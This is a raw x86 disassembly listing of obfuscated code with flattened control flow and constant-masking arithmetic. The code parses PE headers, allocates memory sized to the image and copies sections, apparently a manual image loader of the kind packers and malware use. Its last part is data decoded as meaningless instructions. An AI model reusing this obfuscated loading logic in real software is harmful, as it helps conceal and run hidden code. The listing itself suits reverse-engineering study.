  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	data16 hlt 
  420607:	pop    eax
  420608:	sar    dh,0x8
  42060b:	add    DWORD PTR [ecx],0x0
  42060e:	std    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    dh,ah
  420613:	(bad)  
  420614:	out    0xea,eax
  420616:	xchg   ebp,eax
  420617:	jl     0x420656
  420619:	popf   
  42061a:	add    ecx,ebp
  42061c:	les    esi,FWORD PTR ds:0xedfecb28
  420622:	std    
  420623:	call   0xcb8375b8
  420628:	add    BYTE PTR [ebx],bl
  42062a:	fwait
  42062b:	add    ah,ah
  42062d:	enter  0x3140,0x30
  420631:	cmp    ah,BYTE PTR [eax]
  420633:	sub    BYTE PTR [esi],0x44
  420636:	xchg   esp,eax
  420637:	dec    esi
  420638:	add    ch,BYTE PTR [ecx]
  42063a:	inc    eax
  42063b:	adc    BYTE PTR [edi-0x3860f830],0x88
  420642:	cli    
  420643:	mov    BYTE PTR [esi-0x4c],bh
  420646:	aad    0xa3
  420648:	out    dx,eax
  420649:	inc    edi
  42064a:	dec    eax
  42064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064c:	sti    
  42064d:	cmp    esi,DWORD PTR ds:0xfc3e338a
  420653:	cmc    
  420654:	daa    
  420655:	mov    ds:0x376ae402,eax
  42065a:	shl    DWORD PTR [edx+0x489c985f],1
  420660:	inc    esi
  420661:	leave  
  420662:	int3   
  420663:	push   edi
  420664:	xchg   BYTE PTR [eax+eax*2-0x40],ch
  420668:	fild   DWORD PTR [edx]
  42066a:	xchg   esp,eax
  42066b:	arpl   WORD PTR [ebp+0x70],cx
  42066e:	mov    eax,0xc53b82e6
  420673:	sahf   
  420674:	test   al,0xe8
  420676:	and    DWORD PTR [eax],esp
  420678:	pushf  
  420679:	inc    esp
  42067a:	xchg   esp,eax
  42067b:	(bad)
  42067f:	(bad)  
  420680:	adc    DWORD PTR [ebx-0x5d],eax
  420683:	cld    
  420684:	add    al,0x4b
  420686:	pusha  
  420687:	cmp    ebp,DWORD PTR [edi-0x1b90152]
  42068d:	add    bh,BYTE PTR [esi]
  42068f:	cli    
  420690:	mov    al,0x62
  420692:	daa    
  420693:	adc    ebp,DWORD PTR [edi]
  420695:	and    al,0x1b
  420697:	sub    dl,bh
  420699:	aaa    
  42069a:	rol    DWORD PTR [edx+0x72],cl
  42069d:	stos   DWORD PTR es:[edi],eax
  42069e:	aas    
  42069f:	jo     0x420663
  4206a1:	dec    ebp
  4206a2:	push   0xffffffe4
  4206a4:	std    
  4206a5:	pop    ecx
  4206a6:	and    al,0xb2
  4206a8:	sbb    eax,0x91794e39
  4206ad:	ds jge 0x420709
  4206b0:	jmp    0x420682
  4206b2:	repz mov cl,0xb9
  4206b5:	push   ebp
  4206b6:	mov    cs,WORD PTR [edi]
  4206b8:	xor    dl,dh
  4206ba:	xor    ebp,DWORD PTR [esi-0x7b]
  4206bd:	cmp    bl,BYTE PTR [ecx+edi*1+0x66333874]
  4206c4:	popf   
  4206c5:	(bad)  
  4206c6:	cmp    bh,BYTE PTR [ebp+0x6db2a3ab]
  4206cc:	mov    al,ds:0x6afc9fcb
  4206d1:	pop    esp
  4206d2:	xchg   edi,eax
  4206d3:	(bad)  
  4206d4:	and    al,0xb8
  4206d6:	aas    
  4206d7:	inc    ebp
  4206d8:	add    al,0xb7
  4206da:	sub    BYTE PTR [edi+ebp*2+0x22],ch
  4206de:	jl     0x420748
  4206e0:	dec    ebx
  4206e1:	lock add eax,0x413da51f
  4206e7:	cmp    bl,al
  4206e9:	pop    ecx
  4206ea:	push   eax
  4206eb:	adc    cl,bh
  4206ed:	sub    al,0x95
  4206ef:	clc    
  4206f0:	sbb    al,0x3b
  4206f2:	jl     0x420713
  4206f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206f5:	lahf   
  4206f6:	out    0x3d,eax
  4206f8:	pop    ecx
  4206f9:	enter  0x367a,0xec
  4206fd:	mov    bl,0xea
  4206ff:	add    eax,eax
  420701:	inc    ebx
  420702:	jp     0x42073f
  420704:	jnp    0x420732
  420706:	addr16 push 0xffffffee
  420709:	sub    esp,DWORD PTR ds:0xb2e0058c
  42070f:	pop    eax
  420710:	jl     0x42073c
  420712:	sub    eax,0xbcf2a28f
  420717:	test   eax,0x7fed9f35
  42071c:	enter  0x1cc4,0xc
  420720:	lds    ebp,FWORD PTR [edx-0x41]
  420723:	arpl   WORD PTR [edx-0x40],sp
  420726:	(bad)  
  420727:	lea    ecx,[ecx+0x2e55b2b1]
  42072d:	push   0xfe092f87
  420732:	cwde   
  420733:	inc    eax
  420734:	cld    
  420735:	ja     0x42078b
  420737:	dec    esp
  420738:	call   FWORD PTR [ebx-0x68e603d2]
  42073e:	inc    eax
  42073f:	push   ecx
  420740:	sbb    al,0x38
  420742:	icebp  
  420743:	pushf  
  420744:	mov    ebp,0xc824061e
  420749:	outs   dx,BYTE PTR ds:[si]
  42074b:	sahf   
  42074c:	adc    edi,ebp
  42074e:	aad    0x3a
  420750:	cmp    esp,DWORD PTR [esp+edx*2-0x5b]
  420754:	xor    esi,0xffffff89
  420757:	daa    
  420758:	pop    esi
  420759:	pop    ebx
  42075a:	push   esi
  42075b:	jne    0x4206f1
  42075d:	ror    BYTE PTR [ecx+0x56],cl
  420760:	pop    ebx
  420761:	icebp  
  420762:	xor    dh,BYTE PTR [edi]
  420764:	push   ss
  420765:	call   0x931a:0x7d553f80
  42076c:	sti    
  42076d:	(bad)  
  42076e:	test   BYTE PTR [edi+0x3cf59d18],dl
  420774:	fcomp  DWORD PTR [ecx+0x4b290498]
  42077a:	mov    ah,0x4e
  42077c:	and    ah,BYTE PTR [ecx]
  42077e:	pop    eax
  42077f:	addr16 push ebp
  420781:	sar    dh,cl
  420783:	jnp    0x42075d
  420785:	pop    ds
  420786:	outs   dx,DWORD PTR ds:[esi]
  420787:	test   BYTE PTR [ecx],0x6f
  42078a:	enter  0xda58,0xb1
  42078e:	ficomp WORD PTR [eax-0x6795b12d]
  420794:	cmp    al,0x6d
  420796:	jne    0x420752
  420798:	sub    ecx,ebp
  42079a:	mov    al,0xd
  42079c:	cdq    
  42079d:	(bad)  
  42079e:	sti    
  42079f:	fcomp  DWORD PTR [edi+0x7]
  4207a2:	dec    edi
  4207a3:	mov    dl,0x1
  4207a5:	jmp    0x2ca56ed4
  4207aa:	mov    WORD PTR [edi+ebx*1+0x6f],fs
  4207ae:	adc    BYTE PTR [ebx+0x11],cl
  4207b1:	dec    ecx
  4207b2:	pop    ecx
  4207b3:	xor    eax,DWORD PTR [edx-0x6dbb2a21]
  4207b9:	test   eax,0xb83e7ea
  4207be:	mov    esi,0xbb2960cd
